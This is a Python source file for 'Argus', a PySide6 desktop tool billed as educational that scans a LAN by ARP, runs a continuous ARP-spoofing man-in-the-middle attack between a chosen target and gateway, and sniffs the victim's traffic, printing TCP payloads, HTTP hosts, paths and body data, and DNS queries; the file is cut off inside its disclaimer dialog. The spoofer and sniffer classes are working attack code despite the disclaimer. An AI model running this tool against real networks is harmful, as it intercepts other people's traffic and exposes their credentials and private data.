"""
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║         🛡️ Argus v1.0 | Educational Application           ║
║                                                                           ║
║  This is an EDUCATIONAL tool for learning network security concepts      ║
║  Computer Science & Cybersecurity Learning | Red Team Training           ║
║                                                                           ║
║  DISCLAIMER: For educational use only. Requires proper authorization.    ║
║  Unauthorized network access is illegal.                                 ║
║                                                                           ║
║  Author: Argus | Date: January 2026 | License: Educational Use     ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""


import sys
import threading
import time
import socket
import ipaddress
from dataclasses import dataclass
from typing import List, Dict, Optional
import psutil
import scapy.all as scapy
from scapy.layers.inet import IP, TCP
from scapy.layers import http
from PySide6.QtCore import Qt, QTimer, QObject, Signal, QPointF
from PySide6.QtGui import QPalette, QColor, QFont, QTextCursor, QPainter, QPen, QBrush, QCursor, QPolygonF, QPainterPath, QIcon, QPixmap
from PySide6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QHBoxLayout, QVBoxLayout,
    QFrame, QLabel, QPushButton, QTableWidget, QTableWidgetItem,
    QPlainTextEdit, QSizePolicy, QMessageBox, QLineEdit,
    QSpinBox, QCheckBox, QTabWidget, QGroupBox, QGridLayout
)

import matplotlib.pyplot as plt
from matplotlib.backends.backend_qt5agg import FigureCanvasQTAgg as FigureCanvas
from matplotlib.figure import Figure
import networkx as nx

__version__ = "1.0"
__author__ = "Argus"
__description__ = "Educational MITM Attack Tool for Learning Network Security"
__purpose__ = "Computer Science & Cybersecurity Education"

SERVER_PORT = 5555  # Chat server port

# ===================== DATA MODEL =====================
@dataclass
class HostEntry:
    ip: str
    mac: str

# ===================== COLORED LOG WIDGET =====================
class ColoredLogWidget(QPlainTextEdit):
    """Custom log widget with colored output"""
    
    COLOR_MAP = {
        'error': '#ff4444',      # Red
        'warning': '#ffaa00',    # Orange/Yellow
        'success': '#44ff44',    # Green
        'detect': '#ff0088',     # Magenta (for detections)
        'info': '#00ffff',       # Cyan
        'debug': '#aaaaaa'       # Gray
    }
    
    def __init__(self):
        super().__init__()
        self.setReadOnly(True)
        self.setStyleSheet("""
            QPlainTextEdit {
                background-color: #0a0e1a;
                color: #e6faff;
                font-family: 'Courier New';
                font-size: 12px;
                border: 2px solid #1a3a4a;
                border-radius: 5px;
                padding: 8px;
            }
        """)
    
    def log(self, message: str, color: str = 'info'):
        """Add colored log message"""
        cursor = self.textCursor()
        cursor.movePosition(QTextCursor.End)
        self.setTextCursor(cursor)
        
        # Create character format with color
        char_format = cursor.charFormat()
        char_format.setForeground(QColor(self.COLOR_MAP.get(color, '#e6faff')))
        
        # Add timestamp
        timestamp = time.strftime('%H:%M:%S')
        cursor.insertText(f"[{timestamp}] ", char_format)
        
        # Add colored message
        cursor.insertText(message + '\n', char_format)
        
        # Auto scroll to bottom
        self.ensureCursorVisible()


# ===================== SCANNER =====================


class NetworkScanner(QObject):
    log = Signal(str, str)  # (message, color)
    finished = Signal(list)

    def scan(self, iface: str):
        threading.Thread(
            target=self._scan_thread,
            args=(iface,),
            daemon=True
        ).start()


    def _scan_thread(self, iface: str):
        try:
            scapy.conf.iface = iface
            self.log.emit(f"[*] Using interface: {iface}", "info")

            iface_ip = scapy.get_if_addr(iface)
            if iface_ip in ("0.0.0.0", "127.0.0.1"):
                raise RuntimeError("Invalid interface IP")

            self.log.emit(f"[*] Interface IP: {iface_ip}", "success")

            netmask = None
            for name, addrs in psutil.net_if_addrs().items():
                for a in addrs:
                    if a.address == iface_ip and a.family == socket.AF_INET:
                        netmask = a.netmask

            if not netmask:
                raise RuntimeError("Could not determine netmask")

            network = ipaddress.IPv4Network(f"{iface_ip}/{netmask}", strict=False)
            self.log.emit(f"[*] Network: {network}", "info")

            targets = [str(ip) for ip in network.hosts()]
            arp = scapy.ARP(pdst=targets)
            ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether / arp

            self.log.emit("[*] Sending ARP requests...", "info")
            result = scapy.srp(packet, timeout=6, iface=iface, verbose=False)
            answered = result[0] if result else []

            hosts = []
            seen = set()

            for _, r in answered:
                if r.psrc not in seen:
                    seen.add(r.psrc)
                    hosts.append(HostEntry(r.psrc, r.hwsrc))
                    self.log.emit(f"[+] HOST FOUND: {r.psrc} → {r.hwsrc}", "detect")

            self.log.emit(f"[✓] Scan complete: {len(hosts)} hosts discovered", "success")
            self.finished.emit(hosts)

        except Exception as e:
            self.log.emit(f"[!] Scan error: {e}", "error")
            self.finished.emit([])

# ===================== ARP SPOOFER =====================

class ARPSpoofer(QObject):
    log = Signal(str, str)  # (message, color)

    def __init__(self):
        super().__init__()
        self.is_running = False
        self.attacker_ip = None
        self.attacker_mac = None

    def start_spoof(self, target_ip: str, gateway_ip: str, iface: str):
        self.is_running = True
        threading.Thread(
            target=self._spoof_thread,
            args=(target_ip, gateway_ip, iface),
            daemon=True
        ).start()

    def stop_spoof(self):
        self.is_running = False
        self.log.emit("[*] Stopping ARP spoof...", "warning")

    def _get_mac(self, ip: str) -> Optional[str]:
        try:
            arp = scapy.ARP(pdst=ip)
            ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether / arp
            result = scapy.srp(packet, timeout=3, verbose=False, retry=2)[0]
            if result:
                return result[0][1].hwsrc
            self.log.emit(f"[!] No MAC found for {ip}", "warning")
            return None
        except Exception as e:
            self.log.emit(f"[!] Error getting MAC for {ip}: {e}", "error")
            return None

    def _spoof(self, target_ip: str, spoof_ip: str, target_mac: str, iface: str):
        arp = scapy.ARP(op="is-at", pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.sendp(arp, iface=iface, verbose=False)

    def _spoof_thread(self, target_ip: str, gateway_ip: str, iface: str):
        try:
            self.log.emit(f"[*] Using interface: {iface}", "info")
            self.log.emit(f"[*] Getting MAC addresses...", "info")
            
            # Set scapy interface for this operation
            scapy.conf.iface = iface
            
            target_mac = self._get_mac(target_ip)
            gateway_mac = self._get_mac(gateway_ip)

            if not target_mac or not gateway_mac:
                self.log.emit(f"[!] Could not resolve MAC addresses - Target: {target_mac}, Gateway: {gateway_mac}", "error")
                return

            self.attacker_mac = scapy.get_if_hwaddr(iface)
            self.attacker_ip = scapy.get_if_addr(iface)

            self.log.emit(f"[+] Target: {target_ip} ({target_mac})", "detect")
            self.log.emit(f"[+] Gateway: {gateway_ip} ({gateway_mac})", "detect")
            self.log.emit(f"[+] Attacker: {self.attacker_ip} ({self.attacker_mac})", "success")
            self.log.emit("[*] Starting ARP spoof...", "warning")

            packets_sent = 0
            while self.is_running:
                self._spoof(target_ip, gateway_ip, target_mac, iface)
                self._spoof(gateway_ip, target_ip, gateway_mac, iface)
                packets_sent += 1
                if packets_sent % 10 == 0:
                    self.log.emit(f"[*] Packets sent: {packets_sent}", "info")
                time.sleep(1)

            self.log.emit("[*] Restoring ARP tables...", "warning")
            for i in range(10):
                self._spoof(target_ip, gateway_ip, target_mac, iface)
                self._spoof(gateway_ip, target_ip, gateway_mac, iface)
                time.sleep(0.1)

            self.log.emit("[✓] ARP spoof stopped and tables restored", "success")

        except Exception as e:
            import traceback
            self.log.emit(f"[!] Spoof error: {e}", "error")
            self.log.emit(traceback.format_exc(), "error")

# ===================== PACKET SNIFFER =====================

class PacketSniffer(QObject):
    log = Signal(str, str)  # (message, color)

    def __init__(self):
        super().__init__()
        self.is_running = False
        self.detect_tcp = True
        self.detect_http = True
        self.detect_dns = True
        self.detect_ip = True
        self.packet_count = 0

    def set_detection_filters(self, tcp=True, http=True, dns=True, ip=True):
        """Set what types of packets to detect"""
        self.detect_tcp = tcp
        self.detect_http = http
        self.detect_dns = dns
        self.detect_ip = ip

    def start_sniff(self, iface: str, victim_ip: str):
        self.is_running = True
        self.packet_count = 0
        threading.Thread(
            target=self._sniff_thread,
            args=(iface, victim_ip),
            daemon=True
        ).start()

    def stop_sniff(self):
        self.is_running = False
        self.log.emit("[*] Stopping packet sniff...", "warning")

    def _sniff_thread(self, iface: str, victim_ip: str):
        try:
            scapy.conf.iface = iface
            self.log.emit(f"[+] Sniffing on {iface} for victim {victim_ip}", "success")
            self.log.emit(f"[*] Filters - TCP: {self.detect_tcp}, HTTP: {self.detect_http}, DNS: {self.detect_dns}, IP: {self.detect_ip}", "info")

            def process(packet):
                if not self.is_running:
                    return False
                
                self.packet_count += 1

                # DETECT IP TRAFFIC
                if self.detect_ip and packet.haslayer(IP):
                    ip = packet[IP]
                    if ip.src != victim_ip and ip.dst != victim_ip:
                        return

                # TCP TRAFFIC
                if self.detect_tcp and packet.haslayer(IP) and packet.haslayer(TCP):
                    ip = packet[IP]
                    tcp = packet[TCP]

                    if ip.src != victim_ip and ip.dst != victim_ip:
                        return

                    self.log.emit("=" * 60, "info")
                    self.log.emit(f"[TCP] {ip.src}:{tcp.sport} → {ip.dst}:{tcp.dport}", "detect")
                    
                    if packet.haslayer(scapy.Raw):
                        try:
                            payload = packet[scapy.Raw].load.decode(errors="ignore")
                            if payload.strip():
                                self.log.emit(f"PAYLOAD: {payload[:100]}", "warning")
                        except:
                            pass

                # HTTP TRAFFIC
                if self.detect_http and packet.haslayer(http.HTTPRequest):
                    ip = packet[IP]
                    if ip.src != victim_ip and ip.dst != victim_ip:
                        return

                    http_layer = packet[http.HTTPRequest]
                    self.log.emit("=" * 60, "info")
                    self.log.emit("[HTTP REQUEST] DETECTED!", "detect")
                    self.log.emit(f"Host: {http_layer.Host.decode()}", "warning")
                    self.log.emit(f"Path: {http_layer.Path.decode()}", "warning")
                    self.log.emit(f"Method: {http_layer.Method.decode()}", "info")

                    if packet.haslayer(scapy.Raw):
                        data = packet[scapy.Raw].load
                        self.log.emit(f"Data: {data.decode(errors='ignore')[:100]}", "warning")

                # DNS TRAFFIC
                if self.detect_dns and packet.haslayer(scapy.DNS):
                    dns = packet[scapy.DNS]
                    if dns.qd:
                        self.log.emit("=" * 60, "info")
                        self.log.emit("[DNS] QUERY DETECTED!", "detect")
                        self.log.emit(f"Domain: {dns.qd.qname.decode()}", "warning")

            try:
                scapy.sniff(iface=iface, prn=process, store=False, stop_filter=lambda x: not self.is_running)
            except PermissionError:
                self.log.emit("[!] Permission denied - Run as Administrator", "error")
                self.is_running = False

        except Exception as e:
            import traceback
            self.log.emit(f"[!] Sniff error: {e}", "error")
            self.log.emit(traceback.format_exc(), "error")

# ===================== NETWORK MAP CANVAS =====================

class NetworkMapCanvas(FigureCanvas):
    def __init__(self, parent=None, width=5, height=5, dpi=100):
        self.fig = Figure(figsize=(width, height), dpi=dpi)
        self.ax = self.fig.add_subplot(111)
        super().__init__(self.fig)
        self.setParent(parent)
        
        # Dark theme
        self.fig.patch.set_facecolor('#050810')
        self.ax.set_facecolor('#050810')
        self.ax.tick_params(colors='#e6faff')
        for spine in self.ax.spines.values():
            spine.set_color('#7fffd4')
        
        self.G = nx.Graph()
        self.pos = {}
        self.hosts = []

    def update_network(self, hosts: List[HostEntry], gateway_ip: str = None):
        """Update network graph with hosts"""
        self.hosts = hosts
        self.G.clear()
        self.ax.clear()
        
        # Add gateway
        if gateway_ip:
            self.G.add_node("Gateway\n" + gateway_ip, type='gateway')
        
        # Add hosts
        for host in hosts:
            label = f"{host.ip}\n({host.mac[-5:]})"
            self.G.add_node(label, type='host')
            if gateway_ip:
                self.G.add_edge("Gateway\n" + gateway_ip, label)
        
        # Layout
        if len(self.G.nodes()) > 0:
            self.pos = nx.spring_layout(self.G, k=2, iterations=50)
            
            # Draw edges
            nx.draw_networkx_edges(
                self.G, self.pos,
                edge_color='#7fffd4',
                width=2,
                ax=self.ax,
                arrows=False
            )
            
            # Draw nodes
            node_colors = []
            for node in self.G.nodes():
                if "Gateway" in node:
                    node_colors.append('#ff6b6b')
                else:
                    node_colors.append('#00d4ff')
            
            nx.draw_networkx_nodes(
                self.G, self.pos,
                node_color=node_colors,
                node_size=2000,
                ax=self.ax
            )
            
            # Draw labels
            nx.draw_networkx_labels(
                self.G, self.pos,
                font_size=8,
                font_color='white',
                ax=self.ax
            )
        
        self.ax.axis('off')
        self.fig.tight_layout()
        self.draw()


class EyeLogoWidget(QWidget):
    """Historical eye emblem with a pupil that tracks global mouse position."""

    def __init__(self, parent=None):
        super().__init__(parent)
        self.setFixedSize(88, 56)
        self._pupil_offset = QPointF(0.0, 0.0)

        self._timer = QTimer(self)
        self._timer.timeout.connect(self._update_target)
        self._timer.start(30)

    def _update_target(self):
        center = QPointF(self.width() / 2, self.height() / 2)
        local_mouse = self.mapFromGlobal(QCursor.pos())
        mouse_point = QPointF(float(local_mouse.x()), float(local_mouse.y()))

        dx = mouse_point.x() - center.x()
        dy = mouse_point.y() - center.y()
        max_radius = 6.0

        dist_sq = dx * dx + dy * dy
        if dist_sq > 0:
            dist = dist_sq ** 0.5
            scale = min(1.0, max_radius / dist)
            self._pupil_offset = QPointF(dx * scale, dy * scale)
        else:
            self._pupil_offset = QPointF(0.0, 0.0)

        self.update()

    def paintEvent(self, event):
        _ = event
        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing)

        gold = QColor("#c8a55a")
        bronze = QColor("#8f6a2a")
        ivory = QColor("#f4efe1")
        iris_color = QColor("#547496")
        pupil_color = QColor("#121417")

        # Triangle base evokes the historical Eye of Providence symbol.
        triangle = QPolygonF([
            QPointF(44, 4),
            QPointF(8, 50),
            QPointF(80, 50),
        ])
        painter.setPen(QPen(bronze, 1.5))
        painter.setBrush(QBrush(QColor(43, 33, 19, 70)))
        painter.drawPolygon(triangle)

        # Stylized rays around the eye.
        painter.setPen(QPen(gold, 1))
        rays = [
            (QPointF(44, 1), QPointF(44, 7)),
            (QPointF(23, 6), QPointF(27, 11)),
            (QPointF(65, 6), QPointF(61, 11)),
            (QPointF(11, 20), QPointF(17, 22)),
            (QPointF(77, 20), QPointF(71, 22)),
            (QPointF(16, 45), QPointF(22, 42)),
            (QPointF(72, 45), QPointF(66, 42)),
        ]
        for start, end in rays:
            painter.drawLine(start, end)

        eye_path = QPainterPath()
        eye_path.moveTo(14, 28)
        eye_path.cubicTo(26, 12, 62, 12, 74, 28)
        eye_path.cubicTo(62, 44, 26, 44, 14, 28)

        painter.setPen(QPen(gold, 2.2))
        painter.setBrush(QBrush(ivory))
        painter.drawPath(eye_path)

        center = QPointF(self.width() / 2, self.height() / 2)
        iris_center = QPointF(center.x() + self._pupil_offset.x() * 0.55, center.y() + self._pupil_offset.y() * 0.55)
        pupil_center = QPointF(center.x() + self._pupil_offset.x(), center.y() + self._pupil_offset.y())

        painter.setPen(Qt.NoPen)
        painter.setBrush(QBrush(iris_color))
        painter.drawEllipse(iris_center, 8, 8)

        painter.setBrush(QBrush(pupil_color))
        painter.drawEllipse(pupil_center, 3.8, 3.8)

        painter.setBrush(QBrush(QColor("#ffffff")))
        painter.drawEllipse(QPointF(pupil_center.x() - 1.2, pupil_center.y() - 1.2), 1.3, 1.3)

# ===================== GUI =====================

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Argus Security Console")
        self.setWindowIcon(self._build_app_icon())
        self.resize(1400, 850)

        self.scanner = NetworkScanner()
        self.scanner.log.connect(self.log)
        self.scanner.finished.connect(self.populate)

        self.spoofer = ARPSpoofer()
        self.spoofer.log.connect(self.log)

        self.sniffer = PacketSniffer()
        self.sniffer.log.connect(self.log)

        self.hosts: List[HostEntry] = []
        self.spoof_running = False
        self.sniff_running = False

        self._ui()
        self._style()

    def _build_app_icon(self) -> QIcon:
        """Create a built-in Argus eye icon for the window title bar/taskbar."""
        size = 64
        pixmap = QPixmap(size, size)
        pixmap.fill(Qt.transparent)

        painter = QPainter(pixmap)
        painter.setRenderHint(QPainter.Antialiasing)

        gold = QColor("#c8a55a")
        bronze = QColor("#8f6a2a")
        ivory = QColor("#f4efe1")
        iris = QColor("#547496")
        pupil = QColor("#121417")

        triangle = QPolygonF([
            QPointF(32, 4),
            QPointF(8, 56),
            QPointF(56, 56),
        ])
        painter.setPen(QPen(bronze, 2))
        painter.setBrush(QBrush(QColor(43, 33, 19, 75)))
        painter.drawPolygon(triangle)

        eye_path = QPainterPath()
        eye_path.moveTo(11, 34)
        eye_path.cubicTo(19, 20, 45, 20, 53, 34)
        eye_path.cubicTo(45, 48, 19, 48, 11, 34)
        painter.setPen(QPen(gold, 3))
        painter.setBrush(QBrush(ivory))
        painter.drawPath(eye_path)

        painter.setPen(Qt.NoPen)
        painter.setBrush(QBrush(iris))
        painter.drawEllipse(QPointF(32, 34), 7, 7)
        painter.setBrush(QBrush(pupil))
        painter.drawEllipse(QPointF(32, 34), 3.5, 3.5)

        painter.end()
        return QIcon(pixmap)

    def _preferred_interface(self) -> Optional[str]:
        """Return the active interface chosen by the OS, if available."""
        try:
            probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                probe.connect(("8.8.8.8", 80))
                local_ip = probe.getsockname()[0]
            finally:
                probe.close()

            for iface_name, addrs in psutil.net_if_addrs().items():
                stats = psutil.net_if_stats().get(iface_name)
                if not stats or not stats.isup:
                    continue

                for addr in addrs:
                    if addr.family == socket.AF_INET and addr.address == local_ip:
                        return iface_name
        except Exception:
            pass

        return self.detect_iface()

    def _style(self):
        palette = QPalette()
        palette.setColor(QPalette.Window, QColor("#050810"))
        palette.setColor(QPalette.WindowText, QColor("#e6faff"))
        palette.setColor(QPalette.Base, QColor("#050b16"))
        palette.setColor(QPalette.Text, QColor("#e6faff"))
        palette.setColor(QPalette.Button, QColor("#0b1f33"))
        palette.setColor(QPalette.ButtonText, QColor("#7fffd4"))
        self.setPalette(palette)

        font = QFont("JetBrains Mono", 11)
        self.setFont(font)

    def _ui(self):
        root = QWidget()
        main_layout = QHBoxLayout(root)

        # ========== LEFT SIDE - CONTROLS ==========
        left = QVBoxLayout()
        
        # HEADER
        header = QLabel("ARGUS")
        header.setFont(QFont("JetBrains Mono", 22, QFont.Bold))
        header.setStyleSheet("color: #d8b56a; padding: 6px 12px 0px 12px; letter-spacing: 2px;")
        sub_header = QLabel("Security Analysis Console")
        sub_header.setFont(QFont("JetBrains Mono", 10))
        sub_header.setStyleSheet("color: #9fb4c8; padding: 0px 12px 6px 12px; letter-spacing: 1px;")

        header_text_layout = QVBoxLayout()
        header_text_layout.setSpacing(0)
        header_text_layout.addWidget(header)
        header_text_layout.addWidget(sub_header)

        header_layout = QHBoxLayout()
        header_layout.addWidget(EyeLogoWidget())
        header_layout.addLayout(header_text_layout)
        header_layout.addStretch()
        left.addLayout(header_layout)
        
        # Scanner section
        scanner_label = QLabel("━━━ NETWORK SCANNER ━━━")
        scanner_label.setFont(QFont("JetBrains Mono", 11, QFont.Bold))
        left.addWidget(scanner_label)
        self.scan_btn = QPushButton("🔍 Scan Network")
        self.scan_btn.setFont(QFont("JetBrains Mono", 11, QFont.Bold))
        self.scan_btn.setFixedHeight(45)
        self.scan_btn.setStyleSheet("""
            QPushButton {
                background-color: #0066cc;
                color: white;
                padding: 12px;
                border-radius: 6px;
                font-weight: bold;
                border: 2px solid #004488;
                font-size: 11px;
            }
            QPushButton:hover {
                background-color: #0088ff;
                border: 2px solid #0055aa;
            }
            QPushButton:pressed {
                background-color: #004499;
                border: 2px solid #003366;
            }
        """)
        self.scan_btn.clicked.connect(self.start_scan)
        left.addWidget(self.scan_btn)

        self.table = QTableWidget(0, 2)
        self.table.setHorizontalHeaderLabels(["IP Address", "MAC Address"])
        self.table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.table.setSelectionBehavior(QTableWidget.SelectRows)
        self.table.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
        self.table.setMaximumHeight(200)
        self.table.setFont(QFont("JetBrains Mono", 11))
        self.table.setStyleSheet("""
            QTableWidget {
                background-color: #0a0e1a;
                color: #00ff88;
                border: 2px solid #1a3a4a;
                gridline-color: #1a3a4a;
                font-size: 11px;
            }
            QHeaderView::section {
                background-color: #0b1f33;
                color: #7fffd4;
                padding: 8px;
                border: 1px solid #1a4a5a;
                font-weight: bold;
                font-size: 11px;
            }
        """)
        left.addWidget(self.table)

        # Spoofing section
        spoof_label = QLabel("━━━ ARP SPOOFING ━━━")
        spoof_label.setFont(QFont("JetBrains Mono", 11, QFont.Bold))
        left.addWidget(spoof_label)
        
        target_layout = QHBoxLayout()
        target_text = QLabel("Target IP:")
        target_text.setFont(QFont("JetBrains Mono", 11))
        target_layout.addWidget(target_text)
        self.target_ip_input = QLineEdit()
        self.target_ip_input.setPlaceholderText("192.168.1.100")
        self.target_ip_input.setFont(QFont("JetBrains Mono", 11))
        self.target_ip_input.setFixedHeight(35)
        self.target_ip_input.setStyleSheet("""
            QLineEdit {
                background-color: #0b1f33;
                color: #7fffd4;
                padding: 6px;
                border-radius: 4px;
                font-size: 11px;
            }
        """)
        target_layout.addWidget(self.target_ip_input)
        left.addLayout(target_layout)

        gateway_layout = QHBoxLayout()
        gateway_text = QLabel("Gateway IP:")
        gateway_text.setFont(QFont("JetBrains Mono", 11))
        gateway_layout.addWidget(gateway_text)
        self.gateway_ip_input = QLineEdit()
        self.gateway_ip_input.setPlaceholderText("192.168.1.1")
        self.gateway_ip_input.setFont(QFont("JetBrains Mono", 11))
        self.gateway_ip_input.setFixedHeight(35)
        self.gateway_ip_input.setStyleSheet("""
            QLineEdit {
                background-color: #0b1f33;
                color: #7fffd4;
                padding: 6px;
                border-radius: 4px;
                font-size: 11px;
            }
        """)
        gateway_layout.addWidget(self.gateway_ip_input)
        left.addLayout(gateway_layout)

        self.spoof_btn = QPushButton("⚡ Start ARP Spoof")
        self.spoof_btn.setFont(QFont("JetBrains Mono", 11, QFont.Bold))
        self.spoof_btn.setFixedHeight(45)
        self.spoof_btn.setStyleSheet("""
            QPushButton {
                background-color: #cc0000;
                color: white;
                padding: 12px;
                border-radius: 6px;
                font-weight: bold;
                border: 2px solid #990000;
                font-size: 11px;
            }
            QPushButton:hover {
                background-color: #ff3333;
                border: 2px solid #cc0000;
            }
            QPushButton:pressed {
                background-color: #990000;
                border: 2px solid #660000;
            }
        """)
        self.spoof_btn.clicked.connect(self.toggle_spoof)
        left.addWidget(self.spoof_btn)

        # Sniffing section
        sniffer_label = QLabel("━━━ PACKET SNIFFER ━━━")
        sniffer_label.setFont(QFont("JetBrains Mono", 11, QFont.Bold))
        left.addWidget(sniffer_label)
        
        victim_layout = QHBoxLayout()
        victim_text = QLabel("Victim IP:")
        victim_text.setFont(QFont("JetBrains Mono", 11))
        victim_layout.addWidget(victim_text)
        self.victim_ip_input = QLineEdit()
        self.victim_ip_input.setPlaceholderText("192.168.1.100")
        self.victim_ip_input.setFont(QFont("JetBrains Mono", 11))
        self.victim_ip_input.setFixedHeight(35)
        self.victim_ip_input.setStyleSheet("""
            QLineEdit {
                background-color: #0b1f33;
                color: #7fffd4;
                padding: 6px;
                border-radius: 4px;
                font-size: 11px;
            }
        """)
        victim_layout.addWidget(self.victim_ip_input)
        left.addLayout(victim_layout)

        # Detection filters
        filter_label = QLabel("━━━ DETECTION FILTERS ━━━")
        filter_label.setFont(QFont("JetBrains Mono", 11, QFont.Bold))
        left.addWidget(filter_label)
        filter_layout = QGridLayout()
        
        self.detect_tcp_check = QCheckBox("TCP Traffic")
        self.detect_tcp_check.setChecked(True)
        self.detect_tcp_check.setFont(QFont("JetBrains Mono", 11))
        self.detect_tcp_check.setStyleSheet("color: #7fffd4; spacing: 8px;")
        
        self.detect_http_check = QCheckBox("HTTP Requests")
        self.detect_http_check.setChecked(True)
        self.detect_http_check.setFont(QFont("JetBrains Mono", 11))
        self.detect_http_check.setStyleSheet("color: #7fffd4; spacing: 8px;")
        
        self.detect_dns_check = QCheckBox("DNS Queries")
        self.detect_dns_check.setChecked(True)
        self.detect_dns_check.setFont(QFont("JetBrains Mono", 11))
        self.detect_dns_check.setStyleSheet("color: #7fffd4; spacing: 8px;")
        
        self.detect_ip_check = QCheckBox("All IP Traffic")
        self.detect_ip_check.setChecked(True)
        self.detect_ip_check.setFont(QFont("JetBrains Mono", 11))
        self.detect_ip_check.setStyleSheet("color: #7fffd4; spacing: 8px;")
        
        filter_layout.addWidget(self.detect_tcp_check, 0, 0)
        filter_layout.addWidget(self.detect_http_check, 0, 1)
        filter_layout.addWidget(self.detect_dns_check, 1, 0)
        filter_layout.addWidget(self.detect_ip_check, 1, 1)
        
        left.addLayout(filter_layout)

        self.sniff_btn = QPushButton("📡 Start Sniffing")
        self.sniff_btn.setFont(QFont("JetBrains Mono", 11, QFont.Bold))
        self.sniff_btn.setFixedHeight(45)
        self.sniff_btn.setStyleSheet("""
            QPushButton {
                background-color: #00aa00;
                color: white;
                padding: 12px;
                border-radius: 6px;
                font-weight: bold;
                border: 2px solid #008800;
                font-size: 11px;
            }
            QPushButton:hover {
                background-color: #00dd00;
                border: 2px solid #00aa00;
            }
            QPushButton:pressed {
                background-color: #008800;
                border: 2px solid #005500;
            }
        """)
        self.sniff_btn.clicked.connect(self.toggle_sniff)
        left.addWidget(self.sniff_btn)
        
        # Footer with branding
        left.addStretch()
        footer = QLabel("────────────────────────────────\n© Argus 2026 | Argus\n────────────────────────────────")
        footer.setFont(QFont("JetBrains Mono", 9))
        footer.setStyleSheet("color: #ff6b6b; text-align: center; padding: 10px;")
        footer.setAlignment(Qt.AlignCenter)
        left.addWidget(footer)

        # ========== CENTER - NETWORK MAP ==========
        center = QVBoxLayout()
        map_label = QLabel("━━━ NETWORK TOPOLOGY ━━━")
        map_label.setFont(QFont("JetBrains Mono", 12, QFont.Bold))
        map_label.setStyleSheet("color: #7fffd4; font-weight: bold; padding: 5px;")
        center.addWidget(map_label)
        self.network_canvas = NetworkMapCanvas()
        center.addWidget(self.network_canvas)

        # ========== RIGHT - LOG ==========
        right = QVBoxLayout()
        log_label = QLabel("━━━ REAL-TIME LOG ━━━")
        log_label.setFont(QFont("JetBrains Mono", 12, QFont.Bold))
        log_label.setStyleSheet("color: #7fffd4; font-weight: bold; padding: 5px;")
        right.addWidget(log_label)
        self.logbox = ColoredLogWidget()
        right.addWidget(self.logbox)

        main_layout.addLayout(left, 1)
        main_layout.addLayout(center, 1)
        main_layout.addLayout(right, 1)
        self.setCentralWidget(root)

    def detect_iface(self) -> Optional[str]:
        for iface in scapy.get_if_list():
            try:
                stats = psutil.net_if_stats().get(iface)
                if not stats or not stats.isup:
                    continue

                ip = scapy.get_if_addr(iface)
                if ip not in ("0.0.0.0", "127.0.0.1"):
                    return iface
            except Exception:
                pass
        return None

    def start_scan(self):
        iface = self._preferred_interface()
        if not iface:
            QMessageBox.critical(self, "Error", "No valid interface found")
            return

        self.scan_btn.setEnabled(False)
        self.scan_btn.setText("⏳ Scanning...")
        self.table.setRowCount(0)
        self.logbox.log("═" * 60, "info")
        self.logbox.log("[*] Starting network scan...", "warning")
        self.scanner.scan(iface)

    def populate(self, hosts: List[HostEntry]):
        self.scan_btn.setEnabled(True)
        self.scan_btn.setText("🔍 Scan Network")
        self.hosts = hosts

        for h in hosts:
            r = self.table.rowCount()
            self.table.insertRow(r)
            self.table.setItem(r, 0, QTableWidgetItem(h.ip))
            self.table.setItem(r, 1, QTableWidgetItem(h.mac))
        
        # Update network map
        gateway = self.gateway_ip_input.text().strip() or "192.168.1.1"
        self.network_canvas.update_network(hosts, gateway)
        self.logbox.log("═" * 60, "success")

    def toggle_spoof(self):
        if self.spoof_running:
            self.spoofer.stop_spoof()
            self.spoof_running = False
            self.spoof_btn.setText("⚡ Start ARP Spoof")
            self.spoof_btn.setStyleSheet("""
                QPushButton {
                    background-color: #cc0000;
                    color: white;
                    padding: 8px;
                    border-radius: 5px;
                    font-weight: bold;
                    border: none;
                }
            """)
        else:
            target_ip = self.target_ip_input.text().strip()
            gateway_ip = self.gateway_ip_input.text().strip()

            if not target_ip or not gateway_ip:
                QMessageBox.warning(self, "Error", "Please enter both Target and Gateway IPs")
                return

            iface = self._preferred_interface()
            if not iface:
                QMessageBox.critical(self, "Error", "No valid interface found")
                return

            self.spoof_running = True
            self.spoof_btn.setText("⏹️ Stop ARP Spoof")
            self.spoof_btn.setStyleSheet("background-color: #990000;")
            self.spoofer.start_spoof(target_ip, gateway_ip, iface)

    def toggle_sniff(self):
        if self.sniff_running:
            self.sniffer.stop_sniff()
            self.sniff_running = False
            self.sniff_btn.setText("Start Sniffing")
            self.sniff_btn.setStyleSheet("")
        else:
            victim_ip = self.victim_ip_input.text().strip()

            if not victim_ip:
                QMessageBox.warning(self, "Error", "Please enter Victim IP")
                return

            iface = self._preferred_interface()
            if iface:
                # Set detection filters before starting
                self.sniffer.set_detection_filters(
                    tcp=self.detect_tcp_check.isChecked(),
                    http=self.detect_http_check.isChecked(),
                    dns=self.detect_dns_check.isChecked(),
                    ip=self.detect_ip_check.isChecked()
                )
                
                self.sniff_running = True
                self.sniff_btn.setText("⏹️ Stop Sniffing")
                self.sniff_btn.setStyleSheet("background-color: #cc0000;")
                self.sniffer.start_sniff(iface, victim_ip)
            else:
                QMessageBox.critical(self, "Error", "No valid interface found")

    def log(self, text: str, color: str = 'info'):
        """Handle colored log messages"""
        QTimer.singleShot(0, lambda: self.logbox.log(text, color))

# ===================== DISCLAIMER DIALOG =====================

def show_educational_disclaimer():
    """Show educational use disclaimer on startup"""
    disclaimer_dialog = QMessageBox()
    disclaimer_dialog.setWindowTitle("⚠️ EDUCATIONAL USE DISCLAIMER")
    disclaimer_dialog.setIcon(QMessageBox.Warning)
    
    disclaimer_text = """
╔═══════════════════════════════════════════════════════════════════╗
║              🛡️ EDUCATIONAL USE ONLY - READ CAREFULLY            ║
╚═══════════════════════════════════════════════════════════════════╝

This tool is designed EXCLUSIVELY for educational purposes and 
authorized network testing in controlled environments.

⚠️  LEGAL WARNING:
═══════════════════════════════════════════════════════════════════

